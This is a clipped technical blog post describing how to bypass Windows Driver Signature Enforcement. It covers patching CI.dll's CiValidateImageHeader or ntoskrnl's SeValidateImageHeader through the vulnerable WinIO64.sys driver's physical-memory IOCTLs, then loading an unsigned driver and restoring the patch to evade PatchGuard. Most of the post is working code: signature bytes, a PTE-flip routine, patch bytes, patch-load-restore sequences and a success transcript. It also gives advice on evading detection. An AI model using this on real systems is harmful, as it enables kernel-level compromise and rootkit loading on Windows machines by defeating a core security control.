---
title: "DSE bypass: why CiValidateImageHeader is the right target"
source: https://dkom.dev/posts/dse-ci-patch/
source_host: dkom.dev
clip_date: 2026-11-16T10:41:38+08:00
trace_id: 9673b8a9-05e9-42af-af4f-a4e7a8fdd545
content_hash: 48e7d9f9744a93fa6d074f60a67cae9a4c2f36c36d2981b2953944b5bb23f006
status: synced
tags: []
series: null
feed_source: dkom.dev·Windows内核/Hypervisor
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41a75244-d011-81b0-bd87-f4add0d7b2c0
ioc: null
---

The common DSE bypass you find in tutorials patches `g_CiOptions` in `CI.dll` to zero. That works, but it is the laziest possible approach. `g_CiOptions` is a bitmask that controls whether CI is consulted at all (0x0 = DSE disabled, 0x6 = DSE enabled), and zeroing it disables the entire code integrity subsystem. Two things make it a bad target. With VBS enabled the variable is protected by Kernel Data Protection, so the write faults instead of landing. And on any system, VBS or not, `NtQuerySystemInformation` hands the effective CI options back to any process that asks, with no elevation required, so a zeroed bitmask is one documented call away from being noticed. You have left a flag off that anything on the box can poll.

The cleaner approach targets `CiValidateImageHeader` in `CI.dll` directly. Patch it to return immediately, load your driver via SCM, restore it. The validation function is offline for the length of one `StartService` call, which measured 180 ms in the run at the end of this post. Nothing else changes.

This post is about the SCM loading path. If you’re manually mapping a PE into kernel memory without going through the loader, DSE never fires in the first place. The [independent pages post](https://dkom.dev/posts/byovd-indpages/) covers that path.

## The call chain from NtLoadDriver to CI.dll

When you call `NtLoadDriver` (or issue `sc start` which calls it internally), the kernel validates the driver image before executing its entry point. The intermediate function names below come from publicly available Windows kernel disassembly; they are stable across Win10 22H2 and Win11 23H2. The chain looks like this:

NtLoadDriver IopLoadDriver (ntoskrnl) MmLoadSystemImage (ntoskrnl) SeValidateImageHeader (ntoskrnl) CiValidateImageHeader (CI.dll) actual signature check lives here CI.dll STATUS_INVALID_IMAGE_HASH

## SeValidateImageHeader vs CiValidateImageHeader

`SeValidateImageHeader` and `SeValidateImageData` are wrapper functions in ntoskrnl. They exist to decouple the kernel from the concrete implementation of code integrity, which lives in `CI.dll`. At runtime, ntoskrnl loads `CI.dll` and resolves the actual validation functions through a function table. `SeValidateImageHeader` is the in-kernel wrapper that calls through into `CI.dll`.

`CI!g_CiOptions` is a global inside `CI.dll`, and nothing in ntoskrnl branches on it. It cannot: that would mean the kernel reading a data symbol out of another module. The kernel calls its wrapper unconditionally, the wrapper goes through the callback table into `CI.dll`, and it is `CI.dll` that reads `g_CiOptions` and returns success without doing the signature work when the enabled bit is clear. The visible effect of zeroing it is the same either way. The path is not, and the difference decides what else you can reach in that chain.

PatchGuard is not what protects `g_CiOptions`. The tutorial patch has been zeroing it for more than a decade and leaving it zeroed, without bugchecking anyone, which settles that on the empirical record alone. What does protect it is KDP. On Windows 11 the variable sits in a dedicated `CiPolicy` section that `CI.dll` hands to `MmProtectDriverSection` during initialisation, and with VBS on the hypervisor makes that page read-only from VTL1. That is prevention, not detection. The write faults where it is issued instead of surfacing later as a `0x109 CRITICAL_STRUCTURE_CORRUPTION` at the next scan. With VBS off there is no KDP and the patch works fine, which is why it is still the technique every tutorial reaches for.

Patching `SeValidateImageHeader` in ntoskrnl gets you one level closer to the metal. One approach pattern-scans ntoskrnl in physical memory and patches both `SeValidateImageData` and `SeValidateImageHeader` to `mov eax, 0; ret`. PatchGuard also scans ntoskrnl function bodies, but the patch-load-restore window is short enough that the timing works in practice.

Patching `CiValidateImageHeader` in `CI.dll` skips the wrapper layer entirely. The reason to prefer it is not that PatchGuard’s coverage of `CI.dll` is narrower. I cannot substantiate that and I have not seen anyone else substantiate it either. The reason is that nothing reports the state of this function. `SystemCodeIntegrityInformation` will tell any caller what `g_CiOptions` currently is. There is no API that returns the first six bytes of `CiValidateImageHeader`. Prefer the target nobody can query.

## Finding the target: mapping CI.dll from disk

You can’t resolve `CiValidateImageHeader` by name. It’s not exported. The approach is to map `CI.dll` from disk as a section image, scan that copy for the function’s prologue bytes, then translate the found offset to the kernel virtual address where `CI.dll` is actually loaded.

Getting the kernel base of `CI.dll` first:

```c
ULONG_PTR GetKernelModuleAddress(const char *name) {
    ULONG size = 0;
    void *buffer = NULL;

    pNtQuerySystemInformation NtQSI =
        (pNtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    NTSTATUS status = NtQSI(SystemModuleInformation, buffer, size, &size);
    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        status = NtQSI(SystemModuleInformation, buffer, size, &size);
    }

    PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)buffer;
    for (ULONG i = 0; i < modules->NumberOfModules; i++) {
        char *fname = (char *)modules->Modules[i].FullPathName
                      + modules->Modules[i].OffsetToFileName;
        if (!_stricmp(fname, name)) {
            ULONG_PTR result = (ULONG_PTR)modules->Modules[i].ImageBase; /* ImageBase is 0 on 24H2+ without SeDebugPrivilege */
            VirtualFree(buffer, 0, MEM_RELEASE);
            return result;
        }
    }
    VirtualFree(buffer, 0, MEM_RELEASE);
    return 0;
}
```

`NtQuerySystemInformation` with class `11` (`SystemModuleInformation`) returns the kernel module list without requiring `SeDebugPrivilege` on most builds. Every loaded module’s kernel base is in `RTL_PROCESS_MODULE_INFORMATION.ImageBase`. On Windows 11 24H2 (build 26100+), `ImageBase` is zeroed without `SeDebugPrivilege`. An elevated token with `SeDebugPrivilege` enabled is required on that build. Enabled is the operative word. An elevated token holds the privilege but holds it disabled, so running as administrator is not sufficient on its own and the symptom is a silent page of zeroes:

```c
TOKEN_PRIVILEGES tp = { 1 };
LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

HANDLE tok = NULL;
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tok);
AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
CloseHandle(tok);
```

[`AdjustTokenPrivileges`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges) returns TRUE even when it enabled nothing, so check `GetLastError() == ERROR_SUCCESS`. Assert `ImageBase != 0` after the query regardless.

Mapping the on-disk image:

```c
void *mapFileIntoMemory(const char *path) {
    HANDLE fh = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE fm = CreateFileMapping(fh, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    void *view = MapViewOfFile(fm, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(fm);
    CloseHandle(fh);
    return view;
}
```

`SEC_IMAGE` tells the loader to apply the PE section layout as if it were a normal load: each section lands at its `VirtualAddress`, not its `PointerToRawData`, so any offset measured in this mapping can be directly applied to the kernel’s loaded copy.

The function signature for `CiValidateImageHeader` in the `.text` section (matched on Win10 22H2, Win11 23H2, and Win11 24H2 build 26100):

```c
const unsigned char CiValidateImageHeaderSig[] = {
    0x48, 0x89, 0x5C, 0x24, 0x20,  // mov [rsp+20h], rbx
    0x55,                           // push rbp
    0x56,                           // push rsi
    0x57                            // push rdi
};
```

Those bytes are the function entry, not a point inside it. `mov [rsp+20h], rbx` writes the home slot the caller reserved for the second integer argument, and that slot only sits at `rsp+20h` before anything has touched `rsp`. If you are carrying a copy of this with a constant subtracted off the match to back up to the entry point, that constant lands your write in the middle of an instruction. An earlier version of this post had `0x23` there and it was wrong. Translating to kernel VA is a straight carry of the offset:

```c
ULONG_PTR ciValidateImageHeader =
    ciMatch - (ULONG_PTR)ciImage + ciBase;
```

`ciMatch` is the VA in the user-mode file mapping where the pattern was found. Subtracting `ciImage` (the mapping base) gives the image-relative offset. Adding `ciBase` (the kernel VA from `NtQuerySystemInformation`) gives the kernel virtual address.

Two assertions before that address is worth anything. Require exactly one hit across `.text`: this prologue shape is ordinary MSVC output, so a build that yields two hits means the pattern is too short to identify anything and needs lengthening. And read the bytes back at the computed kernel address and compare them against the signature before you write. A six-byte write at the wrong address in `CI.dll` bugchecks at the next image validation, which is the next driver load, which is the one you were about to do.

## Write primitives: physical memory vs PTE flip

Both implementations use [WinIO64.sys](https://www.loldrivers.io/drivers/winio64/) as the kernel write primitive. WinIO exposes two IOCTLs that let a user-mode caller map arbitrary physical memory into its address space:

```c
#define IOCTL_MAP   0x80102040
#define IOCTL_UNMAP 0x80102044

struct winio_packet {
    u64 size;
    u64 phys_address;
    u64 phys_handle;
    u64 phys_linear;
    u64 phys_section;
};
```

After `DeviceIoControl(IOCTL_MAP, ...)`, `packet.phys_linear` holds a user-mode VA backed by the specified physical frame. Writing through it writes to physical memory directly, bypassing the kernel’s virtual memory protections.

**Physical scan approach**

This approach scans physical memory directly for ntoskrnl’s MZ header, reading 2 bytes at each 1 MB boundary starting from address 0:

```c
for (u64 i = 0; i < 0x200000000; i += 0x100000) {
    char buf[2];
    read_phys(i, (u64)buf, 2);
    if (buf[0] == 'M' && buf[1] == 'Z') {
        ntos_base_pa = i;
        break;
    }
}
```

That loop is a heuristic, and it is the weakest thing in this post. Three problems with it, all of which land on somebody else’s hardware rather than on mine. Every loaded image has `MZ` at the start of its first page, so the first hit is whichever such page happens to sit lowest at a 1 MB boundary, and nothing establishes that it is ntoskrnl. The `0x200000000` bound stops the walk at 8 GiB, so a kernel mapped above that is never found. And starting at physical zero walks through the legacy low region and through whatever PCI apertures are mapped under the top of the scan, where reads are not free: some device registers have read side effects, and some unclaimed physical addresses answer with a machine check instead of a value.

Fix the first two by validating the candidate instead of trusting it: walk `e_lfanew`, check `PE\0\0`, and check that the export directory’s name string is `ntoskrnl.exe`. Fix the third by reading the RAM ranges out of `\Registry\Machine\Hardware\ResourceMap\System Resources\Physical Memory` and scanning only those. If you do not want to write any of that, use the PTE flip below, which never touches an address it did not derive.

Once the physical base is found, a pattern scan over the next `0xBFFFFF` bytes locates `SeValidateImageHeader`. The patch is 6 bytes:

```c
char patch[6] = {
    0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, 0
    0xC3                            // ret
};
```

`mov eax, 0` sets the return value to zero (`STATUS_SUCCESS`), `ret` returns immediately. `SeValidateImageData` gets the same treatment. Both original byte sequences are saved first.

**PTE flip approach**

A second approach targets `CiValidateImageHeader` in CI.dll directly. Kernel text pages are mapped read-only. Rather than going through physical addresses, it flips the write bit in the page table entry for the target page.

`MiGetPteAddress` in ntoskrnl computes the PTE address for any given virtual address. Its prologue contains a fixed pattern that embeds the PTE_BASE constant:

```nasm
shr rcx, 9          ; 48 C1 E9 09
mov rax, <PTE_BASE> ; 48 B8 xx xx xx xx xx xx xx xx
```

The 8-byte immediate after `48 B8` is the PTE base for the current boot. Scanning ntoskrnl’s `.text` section for `{ 0x48, 0xC1, 0xE9, 0x09, 0x48, 0xB8 }` and reading the following 8 bytes gives PTE_BASE without requiring a kernel read primitive against a known symbol.

With PTE_BASE in hand, the PTE address for any virtual address is:

```c
ULONG_PTR getPTEForVA(ULONG_PTR pteBase, ULONG_PTR address) {
    address = address >> 9;
    address &= 0x7FFFFFFFF8;
    address += pteBase;
    return address;
}
```

This is the same arithmetic `MiGetPteAddress` performs at runtime. The result is a kernel virtual address in the PTE self-map range, the same VA `MiGetPteAddress` would return.

It is only a PTE address if the target is backed by a 4 KiB page. Windows maps kernel image text with large pages when memory conditions allow, and HVCI is one of the things that forces 4 KiB granularity, so the configuration this post targets is the one where a 2 MiB mapping is most plausible. Inside a large page there is no page table under the PDE, and the address this function returns points at whichever other entry occupies that slot of the self-map. Read it and you get an unrelated translation. Set bit 1 and write it back and you have corrupted one, then bugchecked somewhere that will not point at this code. Applying the same arithmetic twice gives the PDE, and bit 7 is `PS`:

```c
ULONG_PTR pdeAddress = getPTEForVA(pteBase, getPTEForVA(pteBase, address));

UINT64 pde = 0;
read_phys(va_to_pa(pdeAddress), (UINT64)&pde, sizeof(pde));
if (pde & 0x80)      /* PS set: 2 MiB page, no page table beneath it */
    return 0;
```

The second check belongs here too. The patch is six bytes, and if `ciValidateImageHeader & 0xFFF` is above `0xFFA` some of them land in the next page, whose PTE nobody made writable. A supervisor write to a read-only kernel page is `MmAccessFault` into `KeBugCheckEx(0xBE)` and there is nothing to catch it. Roughly six chances in four thousand per build, which means it will not show up while you are testing and will show up in somebody’s reproduction. Either assert the patch fits inside the page, or flip both PTEs.

To write the PTE through a physical memory primitive you need the physical address of that PTE page, not its self-map VA. Translate it using the same VA-to-PA path as for any other page, then read it, set bit 1 (the writable bit), and write it back:

```c
UINT64 ptePA = va_to_pa(pteAddress);

UINT64 pteValue = 0;
read_phys(ptePA, (UINT64)&pteValue, sizeof(pteValue));
pteValue |= 2;  // set writable bit (R/W bit, Intel SDM Vol.3 Table 4-20)
write_phys(ptePA, (UINT64)&pteValue, sizeof(pteValue));
```

Nothing here invalidates the TLB. The PTE was modified through the WinIO physical view, which is a different virtual mapping, so the kernel performs no shootdown and issues no `INVLPG`. A core still holding the cached read-only translation faults on the code write that follows, `MmAccessFault` re-walks the tables, finds the entry writable, and dismisses the fault as spurious. That resolution is what makes this work without an explicit invalidation. Worth knowing it is what you are relying on.

Now the page that backs `ciValidateImageHeader` is writable. A single-byte patch looks like enough:

```c
char patch[] = { 0xC3 };  // ret
write_phys(va_to_pa(ciValidateImageHeader), (u64)&patch, sizeof(patch));
```

`0xC3` is a near return. The function returns immediately with whatever garbage is in `rax`. In context, the caller interprets a non- `STATUS_SUCCESS` return as signature failure, so you want the return value to be zero. A 6-byte `mov eax, 0; ret` is safer and is what you should use:

```c
char patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
```

A bare `0xC3` depends on `rax` being zero when the function is entered. That’s not guaranteed. Patch 6 bytes.

One thing the stub does not do: `CiValidateImageHeader` has output parameters, and `mov eax, 0; ret` returns `STATUS_SUCCESS` without writing any of them. The caller in ntoskrnl takes policy information back from `CI.dll` and later releases it through `CI!CiFreePolicyInfo`. That the load below succeeds and the machine stays up is the evidence that the caller zero-initialises those locals, so the free is a no-op. That is an observation about this call site on these builds, not a general property. Retarget the same idea at a different slot in the callback table and check what the caller does with what the callee was supposed to write, before assuming a bare success return is harmless.

## Patch-load-restore: why restore is not optional

PatchGuard runs periodic checks that include verifying CI.dll’s loaded image against a baseline. The timing is nondeterministic, but a permanent `0xC3` at the start of `CiValidateImageHeader` is a scannable anomaly.

The correct sequence:

1.  Save original bytes at the target function
2.  Apply patch
3.  Load driver via SCM (`sc create` + `sc start`)
4.  Restore original bytes immediately

SCM’s `StartService` call blocks until the driver’s `DriverEntry` returns or the load fails. The patch is live for the duration of that blocking call. The run at the end of this post measured 180 ms, and that is the number to reason about. It is short enough that PatchGuard’s random scan interval makes detection unlikely. Not impossible, but the window is narrow.

Before any of this, run the read-only probe linked at the bottom. It locates the function, derives the PTE address and prints both without writing anything. Bad arithmetic in the patching tool is a bugcheck. Bad arithmetic in a tool that only reads is a wrong number on your screen.

The physical scan approach implements this correctly:

```c
// save originals
read_phys(se_validate_image_data_pa,   (u64)&se_validate_image_data_original,   6);
read_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, 6);

// patch
write_phys(se_validate_image_data_pa,   (u64)&patch, 6);
write_phys(se_validate_image_header_pa, (u64)&patch, 6);

// load_driver is a thin wrapper: sc create <name> binPath= <path> type= kernel, then sc start <name>
// StartService blocks until DriverEntry returns, so the patch is live only for that window
load_driver(service_name, driver_path);

// restore
write_phys(se_validate_image_data_pa,   (u64)&se_validate_image_data_original, 6);
write_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, 6);
```

The PTE flip approach targeting CI.dll requires the same discipline, plus restoring the PTE write bit:

```c
/* save original bytes at CiValidateImageHeader */
BYTE orig[6] = {0};
read_phys(ciValidateImageHeader_pa, (UINT64)orig, sizeof(orig));

/* flip PTE write bit so the page is writable */
UINT64 ptePA = va_to_pa(pteAddress);
UINT64 pte = 0;
read_phys(ptePA, (UINT64)&pte, sizeof(pte));
pte |= 2;
write_phys(ptePA, (UINT64)&pte, sizeof(pte));

/* patch: mov eax, 0; ret */
BYTE patch[6] = {0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3};
write_phys(ciValidateImageHeader_pa, (UINT64)patch, sizeof(patch));

/* load_driver: sc create <name> binPath= <path> type= kernel, then sc start <name> */
load_driver(service_name, driver_path);

/* restore original bytes */
write_phys(ciValidateImageHeader_pa, (UINT64)orig, sizeof(orig));

/* restore PTE: re-read first, then clear only the write bit */
read_phys(ptePA, (UINT64)&pte, sizeof(pte));
pte &= ~(UINT64)2;
write_phys(ptePA, (UINT64)&pte, sizeof(pte));
```

Both steps matter after load: restoring the function bytes removes the patch from CI.dll, and clearing the PTE write bit puts the page protection back to what PatchGuard expects. Skip either one and you have an anomaly sitting in memory until PatchGuard’s next scan.

The re-read before the restore is not decoration. The copy taken before the patch is stale by the time you put it back: the processor has set the Accessed bit, and the patch write itself set Dirty. Writing the old value back clears both, which is a read-modify-write that discards a hardware update. On a kernel code page the practical consequence is usually nothing. One line is cheaper than finding out.

## Confirming the bypass

Running the PTE flip approach on Win11 24H2 (build 26100), elevated and with `SeDebugPrivilege` enabled, loading an unsigned test driver:

```text
[*] ntoskrnl.exe base:     0xfffff80334200000
[*] CI.dll base:           0xfffff80335a40000
[*] CiValidateImageHeader: 0xfffff80335a5c3a4
[*] MiGetPteAddress at:    0xfffff80334b71830
[*] PTE base:              0xffffb00000000000
[*] PTE for CI target:     0xffffb001aad1e1d0
[*] original bytes:        48 89 5c 24 20 55 56 57
[*] flipping PTE write bit...
[*] patching CiValidateImageHeader -> b8 00 00 00 00 c3
[*] loading test_payload.sys via SCM...
[+] driver loaded: STATUS_SUCCESS (0x00000000)
[*] restoring CiValidateImageHeader bytes...
[*] restoring PTE write bit...
[+] done. DSE window: ~180ms
```

> **Verify with [DebugView](https://learn.microsoft.com/en-us/sysinternals/downloads/debugview):** Run `dbgview64.exe` as administrator, enable Kernel Capture (Ctrl+K). `DbgPrint` output from your driver’s `DriverEntry` appears here in real time. If the load succeeded, you’ll see your driver’s output alongside the STATUS_SUCCESS from the loader.

> **Verify with [System Informer](https://systeminformer.sourceforge.io/):** Kernel → Modules tab (requires driver). Your driver appears in the module list with its full image path immediately after load, regardless of whether you delete the registry key afterward.

## What breaks with HVCI

Neither of these works on a system with Hypervisor-Protected Code Integrity (HVCI) enabled. Under HVCI the guest still owns and walks its own page tables. What it does not own is the translation underneath them. VBS uses second-level address translation, and at that level the frames backing kernel code are not writable and the kernel’s own page tables are write-protected, so flipping a bit in a PTE traps to the hypervisor instead of landing. Making an executable page writable is rejected there. The write_phys approach using WinIO has a similar problem: the hypervisor intercepts writes to physical pages backing kernel code.

HVCI changes the threat model entirely. Bypassing it requires either operating below the hypervisor or exploiting it directly. Neither is covered here.

Both primitives work on systems with HVCI disabled. That is a configuration statement, not a population estimate: in-place upgrades from Windows 10, virtual machines without nested virtualisation, hardware missing the required CPU features, and any box where an administrator, an OEM or an anti-cheat turned memory integrity off. Clean installs of Windows 11 on supported silicon get it on by default, so the share of the fleet this applies to moves every quarter and any number quoted here would be stale by the time you read it.

The physical-scan approach is tested on Win10 22H2 and Win11 23H2. The PTE flip approach is tested on those and on Win11 24H2 build 26100, which is the transcript above.

## The two implementations compared

|     | Physical scan approach | PTE flip approach |
| --- | --- | --- |
| Target function | `SeValidateImageHeader` (ntoskrnl) | `CiValidateImageHeader` (CI.dll) |
| Write primitive | WinIO phys map, PA scan | WinIO phys map, PTE flip |
| Patch size | 6 bytes (`mov eax,0; ret`) | 6 bytes (`mov eax,0; ret`) |
| Restores patch | Yes | Yes (required) |
| Restores PTE | N/A | Yes (required) |
| PatchGuard safety | Short window, restored | Short window, restored |

The CI.dll target is more surgical in principle, and the PTE flip is a cleaner write path than scanning physical memory for an MZ header. Patch-and-restore discipline is what actually makes either approach safe in practice. Target `CiValidateImageHeader`, use the PTE flip, patch 6 bytes, restore both the function bytes and the PTE immediately after `StartService` returns.

Both approaches use SCM to load the driver. The [NtLoadDriver vs SCM post](https://dkom.dev/posts/ntloaddriver-vs-scm/) covers exactly what that leaves behind: registry keys, event log entries, and the SCM database state -- regardless of how clean the patch window was.

## Source

Read-only diagnostic tool that locates `CiValidateImageHeader` and reads its PTE state without writing anything: [ci_probe.c](https://dkom.dev/code/dse-ci-patch/ci_probe.c), [ci_probe.h](https://dkom.dev/code/dse-ci-patch/ci_probe.h)
